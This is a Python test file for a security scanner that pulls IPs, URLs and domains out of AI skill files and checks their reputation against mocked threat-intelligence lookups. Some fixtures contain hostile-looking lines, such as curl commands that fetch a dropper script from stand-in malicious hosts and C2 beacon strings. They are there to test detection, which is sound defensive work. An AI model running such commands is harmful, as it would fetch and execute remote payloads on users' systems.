"""Tests for Stage TI: IOC extraction and TI lookup."""

from __future__ import annotations

from unittest.mock import MagicMock, patch

import pytest

from scanner.ioc.extractor import (
    _extract_domains,
    _extract_ipv4,
    _extract_urls,
    extract_entities,
    extract_entities_from_files,
)
from scanner.models import (
    AnalyzerStatus,
    ScanResult,
    SkillFile,
    SkillFileSegment,
    StageTIResult,
    TIEntityResult,
    Verdict,
)
from scanner.stage_ti.analyzer import TIAnalyzer


# ===================================================================
# IOC Extractor Tests
# ===================================================================

class TestExtractIPv4:
    """Tests for IPv4 extraction."""

    @staticmethod
    def _values(results):
        return [ip for ip, _, _ in results]

    def test_public_ip(self):
        ips = self._values(_extract_ipv4("Connect to 8.8.8.8 for DNS"))
        assert "8.8.8.8" in ips

    def test_multiple_ips(self):
        ips = self._values(_extract_ipv4("Server 1.2.3.4, backup 5.6.7.8"))
        assert "1.2.3.4" in ips
        assert "5.6.7.8" in ips

    def test_skip_private_10(self):
        assert len(_extract_ipv4("Local net 10.0.0.1")) == 0

    def test_skip_private_172(self):
        assert len(_extract_ipv4("Docker 172.17.0.2")) == 0

    def test_skip_private_192(self):
        assert len(_extract_ipv4("LAN 192.168.1.1")) == 0

    def test_skip_loopback(self):
        assert len(_extract_ipv4("localhost 127.0.0.1")) == 0

    def test_skip_link_local(self):
        assert len(_extract_ipv4("APIPA 169.254.1.1")) == 0

    def test_skip_version_number_v_prefix(self):
        assert len(_extract_ipv4("version v1.2.3.4 of the package")) == 0

    def test_skip_version_number_equals(self):
        assert len(_extract_ipv4("version=1.2.3.4")) == 0

    def test_boundary_not_in_word(self):
        """IPs embedded in larger dotted numbers should not match."""
        assert len(_extract_ipv4("module 1.2.3.4.5.6")) == 0

    def test_valid_boundary(self):
        ips = self._values(_extract_ipv4("IP: 154.31.116.5 is public"))
        assert "154.31.116.5" in ips

    def test_position_returned(self):
        text = "IP: 8.8.8.8 done"
        results = _extract_ipv4(text)
        assert len(results) == 1
        ip, start, end = results[0]
        assert text[start:end] == "8.8.8.8"


class TestExtractURLs:
    """Tests for URL extraction."""

    @staticmethod
    def _urls(results):
        return [u for u, _, _, _ in results]

    def test_http_url(self):
        urls = self._urls(_extract_urls("fetch http://evil.example.test/payload"))
        assert any("evil.example.test" in u for u in urls)

    def test_https_url(self):
        urls = self._urls(_extract_urls("curl https://malware.xyz/dropper.sh"))
        assert any("malware.xyz" in u for u in urls)

    def test_skip_github(self):
        assert len(_extract_urls("see https://github.com/user/repo")) == 0

    def test_skip_pypi(self):
        assert len(_extract_urls("install from https://pypi.org/project/foo")) == 0

    def test_skip_google(self):
        assert len(_extract_urls("search https://www.google.com/search?q=test")) == 0

    def test_trailing_punctuation_stripped(self):
        urls = self._urls(_extract_urls("visit https://evil.test/page."))
        assert urls[0] == "https://evil.test/page"


class TestExtractDomains:
    """Tests for standalone domain extraction."""

    @staticmethod
    def _values(results):
        return [d for d, _, _ in results]

    def test_simple_domain(self):
        domains = self._values(_extract_domains("connect to evil.com for c2"))
        assert "evil.com" in domains

    def test_subdomain(self):
        domains = self._values(_extract_domains("beacon to c2.evil.xyz"))
        assert "c2.evil.xyz" in domains

    def test_skip_benign_github(self):
        domains = self._values(_extract_domains("see github.com for details"))
        assert "github.com" not in domains

    def test_skip_email_domain(self):
        domains = self._values(_extract_domains("contact user@example.com"))
        # example.com is in benign list, but also @ prefix should exclude
        assert "example.com" not in domains

    def test_skip_url_domain(self):
        """Domains inside :// URLs should not be double-extracted."""
        domains = self._values(_extract_domains("visit https://evil.test/path"))
        assert "evil.test" not in domains


class TestExtractEntities:
    """Tests for the main extract_entities function."""

    def test_mixed_content(self):
        content = """
        C2 server at 154.31.116.10
        Download from https://malware.xyz/payload
        Also check evil.top for updates
        """
        results = extract_entities(content, "SKILL.md")
        kinds = {r[0] for r in results}
        values = {r[1] for r in results}
        assert "ip" in kinds
        assert "domain_or_url" in kinds
        assert "154.31.116.10" in values
        assert any("malware.xyz" in v for v in values)

    def test_deduplication(self):
        content = "IP 8.8.8.8 and again 8.8.8.8"
        results = extract_entities(content)
        ip_results = [r for r in results if r[1] == "8.8.8.8"]
        assert len(ip_results) == 1

    def test_empty_content(self):
        results = extract_entities("")
        assert results == []

    def test_clean_content(self):
        content = "This is a safe skill that helps with formatting text."
        results = extract_entities(content)
        assert results == []

    def test_source_file_tracked(self):
        content = "connect to 154.31.116.5"
        results = extract_entities(content, "scripts/run.sh")
        assert results[0][2] == "scripts/run.sh"

    def test_position_tracked(self):
        content = "IP: 8.8.8.8 here"
        results = extract_entities(content)
        assert len(results) == 1
        kind, value, src, start, end = results[0]
        assert value == "8.8.8.8"
        assert content[start:end] == "8.8.8.8"

    def test_url_position_tracked(self):
        content = "fetch https://evil.test/payload here"
        results = extract_entities(content)
        assert len(results) >= 1
        url_results = [r for r in results if r[0] == "domain_or_url"]
        assert len(url_results) >= 1
        _, value, _, start, end = url_results[0]
        assert content[start:end] == value


class TestExtractEntitiesFromFiles:
    """Tests for extract_entities_from_files."""

    def test_multiple_files(self):
        files = [
            SkillFileSegment(rel_path="SKILL.md", content="C2: 154.31.116.10", is_entry=True),
            SkillFileSegment(rel_path="run.sh", content="curl https://evil.xyz/p"),
        ]
        results = extract_entities_from_files(files)
        assert len(results) >= 2
        sources = {r[2] for r in results}
        assert "SKILL.md" in sources
        assert "run.sh" in sources

    def test_dedup_across_files(self):
        files = [
            SkillFileSegment(rel_path="a.md", content="IP: 154.31.116.10"),
            SkillFileSegment(rel_path="b.md", content="IP: 154.31.116.10"),
        ]
        results = extract_entities_from_files(files)
        ip_results = [r for r in results if r[1] == "154.31.116.10"]
        assert len(ip_results) == 1
        # First occurrence should be kept
        assert ip_results[0][2] == "a.md"

    def test_fallback_to_content(self):
        results = extract_entities_from_files([], fallback_content="C2: 154.31.116.10")
        assert len(results) == 1


# ===================================================================
# TI Analyzer Tests
# ===================================================================

class TestTIAnalyzer:
    """Tests for TIAnalyzer with mocked TI client."""

    def _make_skill(self, content: str, files=None) -> SkillFile:
        return SkillFile(
            id="test-skill",
            source="test",
            file_path="/tmp/test",
            content=content,
            size_bytes=len(content),
            files=files or [],
        )

    @patch("scanner.stage_ti.analyzer.get_ips_reputation")
    @patch("scanner.stage_ti.analyzer.compromise_and_judge")
    @patch("scanner.stage_ti.analyzer.TiHttpClient")
    def test_black_ip_returns_malicious(self, mock_client_cls, mock_compromise, mock_ip_rep):
        mock_client_cls.return_value = MagicMock()
        mock_ip_rep.return_value = {
            "154.31.116.10": {"risk": "black", "tags": [{"malicious_family": [{"name": "Emotet"}], "src": "ti"}]},
        }
        mock_compromise.return_value = {}

        analyzer = TIAnalyzer(api_key="test-key")
        skill = self._make_skill("Connect to 154.31.116.10 for C2")
        result = analyzer.analyze(skill)

        assert result.verdict == Verdict.MALICIOUS
        assert len(result.entities) == 1
        assert result.entities[0].risk == "black"
        assert result.status == AnalyzerStatus.COMPLETED
        analyzer.close()

    @patch("scanner.stage_ti.analyzer.get_ips_reputation")
    @patch("scanner.stage_ti.analyzer.compromise_and_judge")
    @patch("scanner.stage_ti.analyzer.TiHttpClient")
    def test_suspicious_domain_returns_suspicious(self, mock_client_cls, mock_compromise, mock_ip_rep):
        mock_client_cls.return_value = MagicMock()
        mock_ip_rep.return_value = {}
        mock_compromise.return_value = {
            "https://suspicious.xyz/payload": {"risk": "suspicious", "tags": []},
        }

        analyzer = TIAnalyzer(api_key="test-key")
        skill = self._make_skill("Download https://suspicious.xyz/payload")
        result = analyzer.analyze(skill)

        assert result.verdict == Verdict.SUSPICIOUS
        assert result.status == AnalyzerStatus.COMPLETED
        analyzer.close()

    @patch("scanner.stage_ti.analyzer.get_ips_reputation")
    @patch("scanner.stage_ti.analyzer.compromise_and_judge")
    @patch("scanner.stage_ti.analyzer.TiHttpClient")
    def test_unknown_returns_clean(self, mock_client_cls, mock_compromise, mock_ip_rep):
        mock_client_cls.return_value = MagicMock()
        mock_ip_rep.return_value = {
            "154.31.116.10": {"risk": "unknown", "tags": []},
        }
        mock_compromise.return_value = {}

        analyzer = TIAnalyzer(api_key="test-key")
        skill = self._make_skill("Check 154.31.116.10")
        result = analyzer.analyze(skill)

        assert result.verdict == Verdict.CLEAN
        assert result.status == AnalyzerStatus.COMPLETED
        analyzer.close()

    @patch("scanner.stage_ti.analyzer.TiHttpClient")
    def test_no_entities_returns_clean(self, mock_client_cls):
        mock_client_cls.return_value = MagicMock()
        analyzer = TIAnalyzer(api_key="test-key")
        skill = self._make_skill("This is a safe skill with no IOCs.")
        result = analyzer.analyze(skill)

        assert result.verdict == Verdict.CLEAN
        assert result.entities == []
        assert result.status == AnalyzerStatus.COMPLETED
        analyzer.close()

    @patch("scanner.stage_ti.analyzer.extract_entities_from_files")
    @patch("scanner.stage_ti.analyzer.TiHttpClient")
    def test_api_failure_returns_clean_with_failed_status(self, mock_client_cls, mock_extract):
        mock_client_cls.return_value = MagicMock()
        mock_extract.side_effect = Exception("API timeout")

        analyzer = TIAnalyzer(api_key="test-key")
        skill = self._make_skill("Connect to 154.31.116.10")
        result = analyzer.analyze(skill)

        # Should not raise, should return CLEAN with FAILED status
        assert result.verdict == Verdict.CLEAN
        assert result.status == AnalyzerStatus.FAILED
        assert "API timeout" in result.error
        analyzer.close()


# ===================================================================
# Verdict Merge Tests
# ===================================================================

class TestVerdictMerge:
    """Test that TI verdict correctly escalates final_verdict."""

    def test_ti_malicious_escalates_clean(self):
        """TI MALICIOUS should override Stage 1 CLEAN."""
        result = ScanResult(
            skill=SkillFile(id="s", source="t", file_path="/t", content="", size_bytes=0),
            final_verdict=Verdict.CLEAN,
        )
        result.stage_ti = StageTIResult(
            verdict=Verdict.MALICIOUS,
            entities=[TIEntityResult(entity="1.2.3.4", kind="ip", risk="black")],
        )
        # Simulate orchestrator logic
        if result.stage_ti.verdict == Verdict.MALICIOUS:
            result.final_verdict = Verdict.MALICIOUS
        assert result.final_verdict == Verdict.MALICIOUS

    def test_ti_suspicious_escalates_clean(self):
        result = ScanResult(
            skill=SkillFile(id="s", source="t", file_path="/t", content="", size_bytes=0),
            final_verdict=Verdict.CLEAN,
        )
        result.stage_ti = StageTIResult(
            verdict=Verdict.SUSPICIOUS,
            entities=[TIEntityResult(entity="evil.xyz", kind="domain_or_url", risk="suspicious")],
        )
        if result.stage_ti.verdict == Verdict.SUSPICIOUS and result.final_verdict == Verdict.CLEAN:
            result.final_verdict = Verdict.SUSPICIOUS
        assert result.final_verdict == Verdict.SUSPICIOUS

    def test_ti_clean_keeps_stage1_verdict(self):
        result = ScanResult(
            skill=SkillFile(id="s", source="t", file_path="/t", content="", size_bytes=0),
            final_verdict=Verdict.SUSPICIOUS,
        )
        result.stage_ti = StageTIResult(verdict=Verdict.CLEAN, entities=[])
        # TI CLEAN should not downgrade
        if result.stage_ti.verdict == Verdict.MALICIOUS:
            result.final_verdict = Verdict.MALICIOUS
        elif result.stage_ti.verdict == Verdict.SUSPICIOUS and result.final_verdict == Verdict.CLEAN:
            result.final_verdict = Verdict.SUSPICIOUS
        assert result.final_verdict == Verdict.SUSPICIOUS

    def test_ti_failed_keeps_stage1_verdict(self):
        result = ScanResult(
            skill=SkillFile(id="s", source="t", file_path="/t", content="", size_bytes=0),
            final_verdict=Verdict.CLEAN,
        )
        result.stage_ti = StageTIResult(
            verdict=Verdict.CLEAN,
            status=AnalyzerStatus.FAILED,
            error="timeout",
        )
        # FAILED status with CLEAN verdict should not change anything
        assert result.final_verdict == Verdict.CLEAN
